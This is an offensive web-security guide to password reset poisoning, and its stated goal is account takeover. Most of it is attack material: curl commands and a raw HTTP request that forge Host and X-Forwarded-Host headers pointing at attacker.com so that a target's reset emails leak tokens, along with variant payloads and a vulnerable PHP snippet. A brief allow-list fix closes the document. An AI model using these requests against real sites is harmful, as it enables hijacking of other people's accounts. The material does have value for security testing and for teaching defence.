# 2.1 Password Reset Poisoning

## Goal

Inject attacker domain into password reset links to capture tokens and takeover accounts.

---

## How It Works

```
1. User requests password reset
2. Application generates reset link using Host header
3. Attacker sends request with Host: attacker.com
4. Reset link: https://attacker.com/reset?token=xyz
5. If user trusts link, clicks attacker domain
6. Attacker captures token
7. Uses token to reset password
8. Account takeover!
```

---

## Attack Flow

### Step 1: Identify Reset Functionality
- Find password reset form
- Submit reset request
- Capture email (if possible)

### Step 2: Test with Attacker Host
```bash
# Standard reset request
curl -X POST https://target.com/forgot-password \
     -d "email=victim@example.com"

# With attacker Host header
curl -X POST https://target.com/forgot-password \
     -H "Host: attacker.com" \
     -d "email=victim@example.com"

# Check email for link using attacker.com
```

### Step 3: Exploit

If reset email contains: `https://attacker.com/reset?token=abc123`

Attacker can:
1. Navigate to their domain
2. Capture token in logs
3. Use token to reset victim's password
4. Login as victim

---

## Real-World Scenario

**Target:** SaaS application with password reset

**Vulnerable code:**
```php
$reset_link = "https://" . $_SERVER['HTTP_HOST'] . "/reset?token=$token";
$email_body = "Reset link: $reset_link";
mail($email, $email_body);
```

**Attack:**
```bash
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@gmail.com

Email sent to victim:
"Reset link: https://attacker.com/reset?token=12345"

Victim clicks (might not notice domain)
Attacker captures request with token
Attacker uses token to reset password
Account takeover!
```

## Variations

### Variation 1: X-Forwarded-Host
```bash
curl -X POST https://target.com/forgot-password \
     -H "X-Forwarded-Host: attacker.com" \
     -d "email=victim@example.com"
```

### Variation 2: Port Confusion
```bash
curl -X POST https://target.com/forgot-password \
     -H "Host: target.com:attacker.com" \
     -d "email=victim@example.com"
```

### Variation 3: Subdomain Takeover
```bash
curl -X POST https://target.com/forgot-password \
     -H "Host: attacker-subdomain.target.com" \
     -d "email=victim@example.com"
```

## Detection Challenges

Users might not notice:
- Slightly different domain
- HTTP vs HTTPS difference
- Attacker's domain in URL
- Phishing-like link

## Prevention

```php
// Define allowed hosts
$allowed_hosts = ['target.com', 'www.target.com'];
$host = $_SERVER['HTTP_HOST'];

if (!in_array($host, $allowed_hosts)) {
    $host = 'target.com'; // Default safe value
}

$reset_link = "https://" . $host . "/reset?token=$token";
```
